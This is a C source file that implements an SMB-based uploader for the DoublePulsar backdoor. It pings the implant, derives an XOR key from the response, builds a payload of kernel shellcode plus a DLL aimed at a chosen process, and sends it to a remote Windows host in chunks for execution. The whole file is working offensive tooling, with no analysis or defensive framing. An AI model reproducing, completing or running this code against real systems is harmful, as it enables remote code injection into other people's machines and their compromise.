#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

extern void xor_buffer(uint8_t *buffer, size_t length, uint32_t key);

static int upload_send_all(SOCKET sock, const uint8_t *buffer, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        int amount = length - sent > INT_MAX ? INT_MAX : (int)(length - sent);
        int result = send(sock, (const char *)buffer + sent, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        sent += (size_t)result;
    }

    return 0;
}

static int upload_recv_all(SOCKET sock, uint8_t *buffer, size_t length)
{
    size_t received = 0;

    while (received < length) {
        int amount = length - received > INT_MAX ? INT_MAX : (int)(length - received);
        int result = recv(sock, (char *)buffer + received, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        received += (size_t)result;
    }

    return 0;
}

static int upload_read_smb_response(SOCKET sock, uint8_t **response, size_t *response_length)
{
    uint8_t header[4];
    uint32_t body_length;
    uint8_t *buffer;

    if (upload_recv_all(sock, header, sizeof(header)) != 0)
        return -1;

    body_length = ((uint32_t)header[1] << 16) |
                  ((uint32_t)header[2] << 8) |
                  (uint32_t)header[3];
    if (body_length == 0 || body_length > 16U * 1024U * 1024U)
        return -1;

    buffer = (uint8_t *)malloc((size_t)body_length + sizeof(header));
    if (buffer == NULL)
        return -1;

    memcpy(buffer, header, sizeof(header));
    if (upload_recv_all(sock, buffer + sizeof(header), body_length) != 0) {
        free(buffer);
        return -1;
    }

    *response = buffer;
    *response_length = (size_t)body_length + sizeof(header);
    return 0;
}

static int upload_exchange(SOCKET sock, const uint8_t *packet, size_t packet_length,
                          uint8_t **response, size_t *response_length)
{
    if (upload_send_all(sock, packet, packet_length) != 0)
        return -1;
    return upload_read_smb_response(sock, response, response_length);
}

static int upload_set_u16_le(uint8_t *buffer, size_t length, size_t offset, uint16_t value)
{
    if (offset > length || length - offset < 2)
        return -1;
    buffer[offset] = (uint8_t)(value & 0xff);
    buffer[offset + 1] = (uint8_t)(value >> 8);
    return 0;
}

static int upload_set_u32_le(uint8_t *buffer, size_t length, size_t offset, uint32_t value)
{
    if (offset > length || length - offset < 4)
        return -1;
    buffer[offset] = (uint8_t)(value & 0xff);
    buffer[offset + 1] = (uint8_t)((value >> 8) & 0xff);
    buffer[offset + 2] = (uint8_t)((value >> 16) & 0xff);
    buffer[offset + 3] = (uint8_t)(value >> 24);
    return 0;
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    WSADATA wsa_data;
    SOCKET sock = INVALID_SOCKET;
    HANDLE file = INVALID_HANDLE_VALUE;
    uint8_t *dll = NULL;
    uint8_t *payload = NULL;
    uint8_t *response = NULL;
    uint8_t *packet = NULL;
    size_t response_length = 0;
    size_t dll_size = 0;
    size_t payload_size = 0;
    size_t offset;
    uint16_t user_id;
    uint16_t tree_id;
    uint32_t signature;
    uint32_t key;
    uint32_t inject_hash = 0;
    size_t inject_name_length;
    size_t i;
    int wsa_started = 0;
    int result = -1;
    LARGE_INTEGER file_size;
    struct sockaddr_in address;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535)
        return -1;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        goto cleanup;
    wsa_started = 1;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
        goto cleanup;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1)
        goto cleanup;
    if (connect(sock, (const struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
        goto cleanup;

    file = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        goto cleanup;
    if (!GetFileSizeEx(file, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > (uint64_t)SIZE_MAX) {
        goto cleanup;
    }
    dll_size = (size_t)file_size.QuadPart;
    if (dll_size > SIZE_MAX - (size_t)KERNEL_RUNDLL_SIZE)
        goto cleanup;
    payload_size = (size_t)KERNEL_RUNDLL_SIZE + dll_size;
    if (payload_size > UINT32_MAX || dll_size > UINT32_MAX - 3978U)
        goto cleanup;

    dll = (uint8_t *)malloc(dll_size == 0 ? 1 : dll_size);
    if (dll == NULL)
        goto cleanup;

    {
        size_t read_total = 0;
        while (read_total < dll_size) {
            DWORD request = dll_size - read_total > MAXDWORD
                                ? MAXDWORD
                                : (DWORD)(dll_size - read_total);
            DWORD bytes_read = 0;
            if (!ReadFile(file, dll + read_total, request, &bytes_read, NULL) ||
                bytes_read == 0) {
                goto cleanup;
            }
            read_total += bytes_read;
        }
    }

    if (!CloseHandle(file)) {
        file = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    file = INVALID_HANDLE_VALUE;

    if (upload_read_smb_response(sock, &response, &response_length) == 0) {
        free(response);
        response = NULL;
    }

    if (upload_exchange(sock, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT) - 1,
                        &response, &response_length) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    if (upload_exchange(sock, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT) - 1,
                        &response, &response_length) != 0)
        goto cleanup;
    if (response_length < 34)
        goto cleanup;
    user_id = (uint16_t)response[32] | ((uint16_t)response[33] << 8);
    free(response);
    response = NULL;

    {
        uint8_t tree_packet[sizeof(SMB_TREE_CONNECT_PKT) - 1];
        memcpy(tree_packet, SMB_TREE_CONNECT_PKT, sizeof(tree_packet));
        if (upload_set_u16_le(tree_packet, sizeof(tree_packet), 32, user_id) != 0)
            goto cleanup;
        if (upload_exchange(sock, tree_packet, sizeof(tree_packet),
                            &response, &response_length) != 0)
            goto cleanup;
    }
    if (response_length < 30)
        goto cleanup;
    tree_id = (uint16_t)response[28] | ((uint16_t)response[29] << 8);
    free(response);
    response = NULL;

    {
        uint8_t ping_packet[sizeof(DP_PING_PKT) - 1];
        memcpy(ping_packet, DP_PING_PKT, sizeof(ping_packet));
        if (upload_set_u16_le(ping_packet, sizeof(ping_packet), 28, tree_id) != 0 ||
            upload_set_u16_le(ping_packet, sizeof(ping_packet), 32, user_id) != 0)
            goto cleanup;
        if (upload_exchange(sock, ping_packet, sizeof(ping_packet),
                            &response, &response_length) != 0)
            goto cleanup;
    }
    if ((size_t)SMB_RESP_SIGNATURE_START > response_length ||
        response_length - (size_t)SMB_RESP_SIGNATURE_START < 4)
        goto cleanup;

    signature = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);
    key = (uint32_t)(2U * signature) ^
          ((((signature >> 16) | (signature & 0xFF0000U)) >> 8) |
           (((signature << 16) | (signature & 0xFF00U)) << 8));
    free(response);
    response = NULL;

    payload = (uint8_t *)malloc(payload_size == 0 ? 1 : payload_size);
    if (payload == NULL)
        goto cleanup;
    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, (size_t)KERNEL_RUNDLL_SIZE);
    if (dll_size != 0)
        memcpy(payload + (size_t)KERNEL_RUNDLL_SIZE, dll, dll_size);

    if (upload_set_u32_le(payload, payload_size, KERNEL_RUNDLL_TOTAL_OFFSET,
                          (uint32_t)(dll_size + 3978U)) != 0 ||
        upload_set_u32_le(payload, payload_size, KERNEL_RUNDLL_DLLSIZE_OFFSET,
                          (uint32_t)dll_size) != 0 ||
        upload_set_u32_le(payload, payload_size, KERNEL_RUNDLL_ORDINAL_OFFSET, 1U) != 0)
        goto cleanup;

    inject_name_length = strlen(TARGET_INJECT_PROCESS);
    for (i = 0; i < inject_name_length; ++i)
        inject_hash = inject_hash * 127U + (uint8_t)TARGET_INJECT_PROCESS[i];
    if (upload_set_u32_le(payload, payload_size, KERNEL_RUNDLL_HASH_OFFSET, inject_hash) != 0)
        goto cleanup;

    xor_buffer(payload, payload_size, key);

    if ((size_t)SMB_EXEC_TEMPLATE_LEN != sizeof(DP_EXEC_PKT) - 1)
        goto cleanup;

    for (offset = 0; offset < payload_size; ) {
        size_t chunk_size = payload_size - offset;
        size_t packet_size;
        uint8_t parameters[12];
        uint32_t netbios_length;

        if (chunk_size > SMB_EXEC_SHELLCODE_LEN)
            chunk_size = SMB_EXEC_SHELLCODE_LEN;
        if (chunk_size > UINT16_MAX || offset > UINT32_MAX)
            goto cleanup;

        packet_size = (size_t)SMB_EXEC_TEMPLATE_LEN + 12U + chunk_size;
        packet = (uint8_t *)malloc(packet_size);
        if (packet == NULL)
            goto cleanup;

        memcpy(packet, DP_EXEC_PKT, (size_t)SMB_EXEC_TEMPLATE_LEN);
        if (upload_set_u32_le(parameters, sizeof(parameters), 0, (uint32_t)payload_size) != 0 ||
            upload_set_u32_le(parameters, sizeof(parameters), 4, (uint32_t)chunk_size) != 0 ||
            upload_set_u32_le(parameters, sizeof(parameters), 8, (uint32_t)offset) != 0) {
            goto cleanup;
        }
        xor_buffer(parameters, sizeof(parameters), key);
        memcpy(packet + SMB_EXEC_TEMPLATE_LEN, parameters, sizeof(parameters));
        memcpy(packet + SMB_EXEC_TEMPLATE_LEN + sizeof(parameters), payload + offset, chunk_size);

        netbios_length = (uint32_t)(chunk_size + SMB_EXEC_TEMPLATE_LEN + 12U - 4U);
        if ((size_t)SMB_NETBIOS_LEN_OFFSET > packet_size ||
            packet_size - (size_t)SMB_NETBIOS_LEN_OFFSET < 3 ||
            packet[0] == 0xff ||
            upload_set_u16_le(packet, packet_size, SMB_EXEC_TOTAL_DATA_OFFSET,
                              (uint16_t)chunk_size) != 0 ||
            upload_set_u16_le(packet, packet_size, SMB_EXEC_DATA_COUNT_OFFSET,
                              (uint16_t)chunk_size) != 0 ||
            upload_set_u16_le(packet, packet_size, SMB_EXEC_BYTE_COUNT_OFFSET,
                              (uint16_t)(chunk_size + 12U)) != 0 ||
            upload_set_u16_le(packet, packet_size, SMB_TID_OFFSET, tree_id) != 0 ||
            upload_set_u16_le(packet, packet_size, SMB_UID_OFFSET, user_id) != 0) {
            goto cleanup;
        }
        packet[SMB_NETBIOS_LEN_OFFSET] = (uint8_t)((netbios_length >> 16) & 0xff);
        packet[SMB_NETBIOS_LEN_OFFSET + 1] = (uint8_t)((netbios_length >> 8) & 0xff);
        packet[SMB_NETBIOS_LEN_OFFSET + 2] = (uint8_t)(netbios_length & 0xff);

        if (upload_send_all(sock, packet, packet_size) != 0) {
            goto cleanup;
        }
        free(packet);
        packet = NULL;

        if (upload_read_smb_response(sock, &response, &response_length) != 0)
            goto cleanup;

        offset += chunk_size;
    }

    if (response == NULL || (size_t)DP_RESP_MUX_ID_OFFSET >= response_length)
        goto cleanup;
    if (response[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC)
        goto cleanup;

    result = 0;

cleanup:
    if (packet != NULL)
        free(packet);
    if (response != NULL)
        free(response);
    if (payload != NULL)
        free(payload);
    if (dll != NULL)
        free(dll);
    if (file != INVALID_HANDLE_VALUE)
        CloseHandle(file);
    if (sock != INVALID_SOCKET)
        closesocket(sock);
    if (wsa_started)
        WSACleanup();

    return result;
}